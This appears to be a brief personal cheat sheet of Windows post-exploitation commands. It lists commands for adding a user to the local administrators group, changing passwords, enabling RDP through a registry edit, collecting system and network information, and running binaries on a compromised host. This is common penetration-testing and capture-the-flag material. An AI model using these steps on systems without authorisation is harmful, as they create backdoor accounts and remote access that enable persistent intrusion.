# Post Exploitation Cheat Sheet
This module will contain all Windows/DOS post exploitation items that I use on a daily basis.
## Add Admin User
__1. Add the User:__
* `net user /add [username] [password]`

__2. Add the usedr to the Admin Group:__
* `net localgroup administrators [username] /add`

__3. Change a user's password__
* `net user USERNAME NEWPASS`

## Enable RDP (XP+)
This command will enable RDP on a server which the `reg` command is installed. You must have System access to do so, and RDP must be installed.

__1. To enable RDP (must be Windows XP or above as the `reg` command will be used.)__

* `reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f`

## System / Network Info
These commands will return any system or network information and should be done during post exploitation.
* `netstat -ano` OR JUST `netstat -an`
* `systeminfo` (XP+)

## File System Info
These commands will return information about the  file system of the target Windows(R) server.

__1. To display permission/ownership information of a file or directory:__

`icacls "C:\Documents and Settings\Administrator\Desktop\proof.txt`

## Command Execution
These commands will execute commands or binaries on the compromised Windows(R) System.

__1. To run a binary on the FS of the compromised system from os-shell> in nmap:__

`start /max /d"C:\Program files\foo\" ba.exe -somearguments`
